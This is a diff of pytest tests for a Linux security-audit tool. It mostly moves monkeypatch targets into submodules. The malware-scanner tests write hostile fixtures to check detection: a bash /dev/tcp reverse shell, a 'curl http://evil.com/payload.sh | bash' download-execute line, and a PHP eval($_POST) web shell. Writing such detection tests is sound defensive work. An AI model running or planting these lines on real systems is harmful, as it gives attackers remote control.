@@ -262,7 +262,7 @@ class TestCheckTls:
         assert r.errors
 
     def test_missing_cryptography(self, monkeypatch):
-        monkeypatch.setattr(ec, "_CRYPTO_OK", False)
+        monkeypatch.setattr(ec.checks.security, "_CRYPTO_OK", False)
         r = FakeReporter()
         ec.check_tls(r, "example.com")
         assert r.errors
@@ -403,7 +403,7 @@ class TestCheckWorldWritable:
         bad = tmp_path / "badfile"
         bad.write_text("x")
         bad.chmod(0o777)
-        monkeypatch.setattr(ec, "_WORLD_WRITABLE_DIRS", [str(tmp_path)])
+        monkeypatch.setattr(ec.checks.security, "_WORLD_WRITABLE_DIRS", [str(tmp_path)])
         r = FakeReporter()
         ec.check_world_writable(r)
         assert r.findings
@@ -413,7 +413,7 @@ class TestCheckWorldWritable:
         safe = tmp_path / "safefile"
         safe.write_text("x")
         safe.chmod(0o644)
-        monkeypatch.setattr(ec, "_WORLD_WRITABLE_DIRS", [str(tmp_path)])
+        monkeypatch.setattr(ec.checks.security, "_WORLD_WRITABLE_DIRS", [str(tmp_path)])
         r = FakeReporter()
         ec.check_world_writable(r)
         assert r.findings == []
@@ -428,7 +428,7 @@ class TestCheckSuid:
         f = tmp_path / "mybin"
         f.write_text("x")
         f.chmod(0o4755)
-        monkeypatch.setattr(ec, "_SUID_SEARCH_DIRS", [str(tmp_path)])
+        monkeypatch.setattr(ec.checks.security, "_SUID_SEARCH_DIRS", [str(tmp_path)])
         r = FakeReporter()
         ec.check_suid(r)
         assert r.findings
@@ -438,8 +438,8 @@ class TestCheckSuid:
         f = tmp_path / "mybin"
         f.write_text("x")
         f.chmod(0o4755)
-        monkeypatch.setattr(ec, "_SUID_SEARCH_DIRS", [str(tmp_path)])
-        monkeypatch.setattr(ec, "_SUID_SUSPECT_ROOTS", frozenset())
+        monkeypatch.setattr(ec.checks.security, "_SUID_SEARCH_DIRS", [str(tmp_path)])
+        monkeypatch.setattr(ec.checks.security, "_SUID_SUSPECT_ROOTS", frozenset())
         r = FakeReporter()
         ec.check_suid(r)
         assert r.findings
@@ -451,8 +451,8 @@ class TestCheckSuid:
         f.write_text("x")
         f.chmod(0o4755)
         top = "/" + str(tmp_path).lstrip("/").split("/")[0]  # e.g. "/tmp"
-        monkeypatch.setattr(ec, "_SUID_SEARCH_DIRS", [str(tmp_path)])
-        monkeypatch.setattr(ec, "_SUID_SUSPECT_ROOTS", frozenset({top}))
+        monkeypatch.setattr(ec.checks.security, "_SUID_SEARCH_DIRS", [str(tmp_path)])
+        monkeypatch.setattr(ec.checks.security, "_SUID_SUSPECT_ROOTS", frozenset({top}))
         r = FakeReporter()
         ec.check_suid(r)
         assert r.findings
@@ -471,9 +471,9 @@ class TestCheckCron:
         crontab.write_text(f"0 2 * * * root {script}\n")
 
         r = FakeReporter()
-        ec._CRON_FILES = [str(crontab)]
-        ec._CRON_DIRS  = []
-        ec._CRON_ROOT_SPOOL = "/nonexistent"
+        ec.checks.security._CRON_FILES = [str(crontab)]
+        ec.checks.security._CRON_DIRS  = []
+        ec.checks.security._CRON_ROOT_SPOOL = "/nonexistent"
         ec.check_cron(r)
         assert r.findings
         assert r.findings[0]["severity"] == "CRITICAL"
@@ -487,18 +487,18 @@ class TestCheckCron:
         crontab.write_text(f"0 2 * * * root {script}\n")
 
         r = FakeReporter()
-        ec._CRON_FILES = [str(crontab)]
-        ec._CRON_DIRS  = []
-        ec._CRON_ROOT_SPOOL = "/nonexistent"
+        ec.checks.security._CRON_FILES = [str(crontab)]
+        ec.checks.security._CRON_DIRS  = []
+        ec.checks.security._CRON_ROOT_SPOOL = "/nonexistent"
         ec.check_cron(r)
         assert r.findings == []
         assert r.oks
 
     def test_no_readable_cron_files(self):
         r = FakeReporter()
-        ec._CRON_FILES = ["/nonexistent/crontab"]
-        ec._CRON_DIRS  = []
-        ec._CRON_ROOT_SPOOL = "/nonexistent"
+        ec.checks.security._CRON_FILES = ["/nonexistent/crontab"]
+        ec.checks.security._CRON_DIRS  = []
+        ec.checks.security._CRON_ROOT_SPOOL = "/nonexistent"
         ec.check_cron(r)
         assert r.oks   # "No readable cron files"
 
@@ -563,7 +563,7 @@ class TestReporterOutputHelpers:
 
 class TestRunPortScan:
     def test_open_port_reported(self, monkeypatch):
-        monkeypatch.setattr(ec, "scan", lambda ip, ports, timeout, workers=100: [6379])
+        monkeypatch.setattr(ec.checks.portscan, "scan", lambda ip, ports, timeout, workers=100: [6379])
         r = FakeReporter()
         ec.run_port_scan(r, "127.0.0.1", "127.0.0.1", 1.0)
         assert r.findings
@@ -571,7 +571,7 @@ class TestRunPortScan:
         assert r.findings[0]["port"] == 6379
 
     def test_no_open_ports(self, monkeypatch):
-        monkeypatch.setattr(ec, "scan", lambda ip, ports, timeout, workers=100: [])
+        monkeypatch.setattr(ec.checks.portscan, "scan", lambda ip, ports, timeout, workers=100: [])
         r = FakeReporter()
         ec.run_port_scan(r, "127.0.0.1", "127.0.0.1", 1.0)
         assert r.findings == []
@@ -780,7 +780,7 @@ class TestMainBaseline:
 
     def test_save_baseline_creates_file(self, tmp_path, monkeypatch, capsys):
         bl = str(tmp_path / "baseline.json")
-        monkeypatch.setattr(ec, "scan", lambda ip, ports, timeout, workers=100: [])
+        monkeypatch.setattr(ec.checks.portscan, "scan", lambda ip, ports, timeout, workers=100: [])
         monkeypatch.setattr(sys, "argv", ["ec", "--save-baseline", f"--baseline-file={bl}"])
         ec.main()
         assert os.path.exists(bl)
@@ -792,7 +792,7 @@ class TestMainBaseline:
         data = _make_report([])
         with open(bl, "w") as fh:
             json.dump(data, fh)
-        monkeypatch.setattr(ec, "scan", lambda ip, ports, timeout, workers=100: [])
+        monkeypatch.setattr(ec.checks.portscan, "scan", lambda ip, ports, timeout, workers=100: [])
         monkeypatch.setattr(sys, "argv", ["ec", "--diff-baseline", f"--baseline-file={bl}"])
         ec.main()
         out = capsys.readouterr().out
@@ -802,7 +802,7 @@ class TestMainBaseline:
         bl = str(tmp_path / "baseline.json")
         with open(bl, "w") as fh:
             json.dump(_make_report([]), fh)
-        monkeypatch.setattr(ec, "scan", lambda ip, ports, timeout, workers=100: [6379])
+        monkeypatch.setattr(ec.checks.portscan, "scan", lambda ip, ports, timeout, workers=100: [6379])
         monkeypatch.setattr(sys, "argv", ["ec", "--diff-baseline", f"--baseline-file={bl}"])
         ec.main()
         out = capsys.readouterr().out
@@ -810,7 +810,7 @@ class TestMainBaseline:
 
     def test_diff_baseline_missing_baseline_prints_to_stderr(self, tmp_path, monkeypatch, capsys):
         bl = str(tmp_path / "nope.json")
-        monkeypatch.setattr(ec, "scan", lambda ip, ports, timeout, workers=100: [])
+        monkeypatch.setattr(ec.checks.portscan, "scan", lambda ip, ports, timeout, workers=100: [])
         monkeypatch.setattr(sys, "argv", ["ec", "--diff-baseline", f"--baseline-file={bl}"])
         ec.main()
         err = capsys.readouterr().err
@@ -820,7 +820,7 @@ class TestMainBaseline:
         bl = str(tmp_path / "baseline.json")
         with open(bl, "w") as fh:
             json.dump(_make_report([]), fh)
-        monkeypatch.setattr(ec, "scan", lambda ip, ports, timeout, workers=100: [6379])
+        monkeypatch.setattr(ec.checks.portscan, "scan", lambda ip, ports, timeout, workers=100: [6379])
         monkeypatch.setattr(sys, "argv", [
             "ec", "--diff-baseline", f"--baseline-file={bl}", "--fail-on=critical",
         ])
@@ -831,7 +831,7 @@ class TestMainBaseline:
     def test_diff_baseline_fail_on_no_new_findings_no_exit(self, tmp_path, monkeypatch):
         """--fail-on does not exit when there are no *new* findings."""
         bl = str(tmp_path / "baseline.json")
-        monkeypatch.setattr(ec, "scan", lambda ip, ports, timeout, workers=100: [6379])
+        monkeypatch.setattr(ec.checks.portscan, "scan", lambda ip, ports, timeout, workers=100: [6379])
         # Save baseline from the scan so the finding is already known.
         monkeypatch.setattr(sys, "argv", ["ec", "--save-baseline", f"--baseline-file={bl}"])
         ec.main()
@@ -845,7 +845,7 @@ class TestMainBaseline:
         bl = str(tmp_path / "baseline.json")
         with open(bl, "w") as fh:
             json.dump(_make_report([]), fh)
-        monkeypatch.setattr(ec, "scan", lambda ip, ports, timeout, workers=100: [6379])
+        monkeypatch.setattr(ec.checks.portscan, "scan", lambda ip, ports, timeout, workers=100: [6379])
         monkeypatch.setattr(sys, "argv", [
             "ec", "--diff-baseline", f"--baseline-file={bl}", "--json",
         ])
@@ -858,7 +858,7 @@ class TestMainBaseline:
         bl = str(tmp_path / "baseline.json")
         with open(bl, "w") as fh:
             json.dump(_make_report([]), fh)
-        monkeypatch.setattr(ec, "scan", lambda ip, ports, timeout, workers=100: [6379])
+        monkeypatch.setattr(ec.checks.portscan, "scan", lambda ip, ports, timeout, workers=100: [6379])
         monkeypatch.setattr(sys, "argv", [
             "ec", "--diff-baseline", "--save-baseline", f"--baseline-file={bl}",
         ])
@@ -1000,7 +1000,7 @@ class TestCheckKernelHardening:
             if key in sysctl_map:
                 return sysctl_map[key], None
             return None, "not found"
-        monkeypatch.setattr(ec, "_read_sysctl", fake_read)
+        monkeypatch.setattr(ec.checks.security, "_read_sysctl", fake_read)
         monkeypatch.setattr(ec.os.path, "isdir", lambda p: True)
         r = FakeReporter()
         ec.check_kernel_hardening(r)
@@ -1265,7 +1265,7 @@ class TestRemediateMain:
     def test_dry_run_shows_menu_no_execution(self, tmp_path, capsys, monkeypatch):
         path, _ = _report_with_fixable(tmp_path)
         executed = []
-        monkeypatch.setattr(ec, "_run_fix_cmd", lambda cmd: executed.append(cmd) or (0, ""))
+        monkeypatch.setattr(ec._remediate, "_run_fix_cmd", lambda cmd: executed.append(cmd) or (0, ""))
         ec._remediate_main([path, "--dry-run"])
         assert executed == []
         out = capsys.readouterr().out
@@ -1274,7 +1274,7 @@ class TestRemediateMain:
     def test_all_yes_executes_all(self, tmp_path, monkeypatch):
         path, _ = _report_with_fixable(tmp_path)
         executed = []
-        monkeypatch.setattr(ec, "_run_fix_cmd", lambda cmd: executed.append(cmd) or (0, ""))
+        monkeypatch.setattr(ec._remediate, "_run_fix_cmd", lambda cmd: executed.append(cmd) or (0, ""))
         ec._remediate_main([path, "--all", "--yes"])
         assert "sysctl -w net.ipv4.tcp_syncookies=1" in executed
 
@@ -1291,14 +1291,14 @@ class TestRemediateMain:
         p = tmp_path / "r.json"
         p.write_text(json.dumps(data))
         executed = []
-        monkeypatch.setattr(ec, "_run_fix_cmd", lambda cmd: executed.append(cmd) or (0, ""))
+        monkeypatch.setattr(ec._remediate, "_run_fix_cmd", lambda cmd: executed.append(cmd) or (0, ""))
         ec._remediate_main([str(p), "--item", "2", "--yes"])
         assert executed == ["cmd_b"]
         assert "cmd_a" not in executed
 
     def test_failed_command_exits_1(self, tmp_path, monkeypatch):
         path, _ = _report_with_fixable(tmp_path)
-        monkeypatch.setattr(ec, "_run_fix_cmd", lambda cmd: (1, "permission denied"))
+        monkeypatch.setattr(ec._remediate, "_run_fix_cmd", lambda cmd: (1, "permission denied"))
         with pytest.raises(SystemExit) as exc:
             ec._remediate_main([path, "--all", "--yes"])
         assert exc.value.code == 1
@@ -1506,27 +1506,27 @@ class TestAvTempExecutables:
         r = FakeReporter()
         ec._av_check_temp_executables.__globals__["_AV_TEMP_DIRS"]  # exists
         # pass an empty set of dirs — no findings expected
-        orig = ec._AV_TEMP_DIRS
-        ec._AV_TEMP_DIRS = []
+        orig = ec.checks.security._AV_TEMP_DIRS
+        ec.checks.security._AV_TEMP_DIRS = []
         try:
             ec._av_check_temp_executables(r)
         finally:
-            ec._AV_TEMP_DIRS = orig
+            ec.checks.security._AV_TEMP_DIRS = orig
         assert not r.findings
 
     def test_executable_in_tmp_reported(self, tmp_path):
         exe = tmp_path / "evil.sh"
         exe.write_text("#!/bin/bash\necho x")
         exe.chmod(0o755)
-        orig = ec._AV_TEMP_DIRS
-        ec._AV_TEMP_DIRS = [str(tmp_path)]
+        orig = ec.checks.security._AV_TEMP_DIRS
+        ec.checks.security._AV_TEMP_DIRS = [str(tmp_path)]
         try:
             r = FakeReporter()
             ec._av_check_temp_executables(r)
             assert len(r.findings) == 1
             assert r.findings[0]["severity"] == "HIGH"
         finally:
-            ec._AV_TEMP_DIRS = orig
+            ec.checks.security._AV_TEMP_DIRS = orig
 
 
 class TestAvSuspiciousProcs:
@@ -1567,20 +1567,20 @@ class TestAvScanScripts:
     def test_clean_script_no_finding(self, tmp_path):
         s = tmp_path / "clean.sh"
         s.write_text("#!/bin/bash\necho hello\n")
-        orig = ec._AV_SCRIPT_DIRS
-        ec._AV_SCRIPT_DIRS = [str(tmp_path)]
+        orig = ec.checks.security._AV_SCRIPT_DIRS
+        ec.checks.security._AV_SCRIPT_DIRS = [str(tmp_path)]
         try:
             r = FakeReporter()
             ec._av_scan_scripts(r)
             assert not r.findings
         finally:
-            ec._AV_SCRIPT_DIRS = orig
+            ec.checks.security._AV_SCRIPT_DIRS = orig
 
     def test_reverse_shell_detected(self, tmp_path):
         s = tmp_path / "cron_job.sh"
         s.write_text("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
-        orig = ec._AV_SCRIPT_DIRS
-        ec._AV_SCRIPT_DIRS = [str(tmp_path)]
+        orig = ec.checks.security._AV_SCRIPT_DIRS
+        ec.checks.security._AV_SCRIPT_DIRS = [str(tmp_path)]
         try:
             r = FakeReporter()
             ec._av_scan_scripts(r)
@@ -1588,69 +1588,69 @@ class TestAvScanScripts:
             assert r.findings[0]["severity"] == "HIGH"
             assert "reverse shell" in r.findings[0]["label"].lower()
         finally:
-            ec._AV_SCRIPT_DIRS = orig
+            ec.checks.security._AV_SCRIPT_DIRS = orig
 
     def test_curl_pipe_bash_detected(self, tmp_path):
         s = tmp_path / "deploy.sh"
         s.write_text("curl http://evil.com/payload.sh | bash\n")
-        orig = ec._AV_SCRIPT_DIRS
-        ec._AV_SCRIPT_DIRS = [str(tmp_path)]
+        orig = ec.checks.security._AV_SCRIPT_DIRS
+        ec.checks.security._AV_SCRIPT_DIRS = [str(tmp_path)]
         try:
             r = FakeReporter()
             ec._av_scan_scripts(r)
             assert r.findings
             assert "download-execute" in r.findings[0]["label"].lower()
         finally:
-            ec._AV_SCRIPT_DIRS = orig
+            ec.checks.security._AV_SCRIPT_DIRS = orig
 
     def test_php_webshell_detected(self, tmp_path):
         s = tmp_path / "shell.php"
         s.write_bytes(b"<?php eval($_POST['cmd']); ?>")
-        orig = ec._AV_SCRIPT_DIRS
-        ec._AV_SCRIPT_DIRS = [str(tmp_path)]
+        orig = ec.checks.security._AV_SCRIPT_DIRS
+        ec.checks.security._AV_SCRIPT_DIRS = [str(tmp_path)]
         try:
             r = FakeReporter()
             ec._av_scan_scripts(r)
             assert r.findings
             assert "webshell" in r.findings[0]["label"].lower()
         finally:
-            ec._AV_SCRIPT_DIRS = orig
+            ec.checks.security._AV_SCRIPT_DIRS = orig
 
     def test_file_too_large_skipped(self, tmp_path):
         s = tmp_path / "big.sh"
         s.write_bytes(b"curl http://evil.com/x | bash\n" * 50_000)  # ~1.4 MB
-        orig = ec._AV_SCRIPT_DIRS
-        ec._AV_SCRIPT_DIRS = [str(tmp_path)]
+        orig = ec.checks.security._AV_SCRIPT_DIRS
+        ec.checks.security._AV_SCRIPT_DIRS = [str(tmp_path)]
         try:
             r = FakeReporter()
             ec._av_scan_scripts(r)
             assert not r.findings  # skipped because > 512 KB
         finally:
-            ec._AV_SCRIPT_DIRS = orig
+            ec.checks.security._AV_SCRIPT_DIRS = orig
 
 
 class TestCheckMalware:
     def test_clean_system_reports_ok(self, monkeypatch):
-        monkeypatch.setattr(ec, "_av_run_clamav",          lambda r, p: 0)
-        monkeypatch.setattr(ec, "_av_check_temp_executables", lambda r: 0)
-        monkeypatch.setattr(ec, "_av_check_suspicious_procs", lambda r: 0)
-        monkeypatch.setattr(ec, "_av_check_ld_preload",       lambda r: 0)
-        monkeypatch.setattr(ec, "_av_scan_scripts",           lambda r: 0)
+        monkeypatch.setattr(ec.checks.security, "_av_run_clamav",          lambda r, p: 0)
+        monkeypatch.setattr(ec.checks.security, "_av_check_temp_executables", lambda r: 0)
+        monkeypatch.setattr(ec.checks.security, "_av_check_suspicious_procs", lambda r: 0)
+        monkeypatch.setattr(ec.checks.security, "_av_check_ld_preload",       lambda r: 0)
+        monkeypatch.setattr(ec.checks.security, "_av_scan_scripts",           lambda r: 0)
         r = FakeReporter()
         ec.check_malware(r)
         assert not r.findings
         assert r.oks
 
     def test_findings_from_sublayers_bubble_up(self, monkeypatch):
-        monkeypatch.setattr(ec, "_av_run_clamav",          lambda r, p: 0)
-        monkeypatch.setattr(ec, "_av_check_temp_executables", lambda r: 0)
-        monkeypatch.setattr(ec, "_av_check_suspicious_procs", lambda r: 0)
-        monkeypatch.setattr(ec, "_av_check_ld_preload",       lambda r: 0)
+        monkeypatch.setattr(ec.checks.security, "_av_run_clamav",          lambda r, p: 0)
+        monkeypatch.setattr(ec.checks.security, "_av_check_temp_executables", lambda r: 0)
+        monkeypatch.setattr(ec.checks.security, "_av_check_suspicious_procs", lambda r: 0)
+        monkeypatch.setattr(ec.checks.security, "_av_check_ld_preload",       lambda r: 0)
         def _fake_scripts(r):
             r.finding("HIGH", "Suspicious pattern in cron.sh: reverse shell (bash/TCP)",
                       "why", "fix")
             return 1
-        monkeypatch.setattr(ec, "_av_scan_scripts", _fake_scripts)
+        monkeypatch.setattr(ec.checks.security, "_av_scan_scripts", _fake_scripts)
         r = FakeReporter()
         ec.check_malware(r)
         assert len(r.findings) == 1
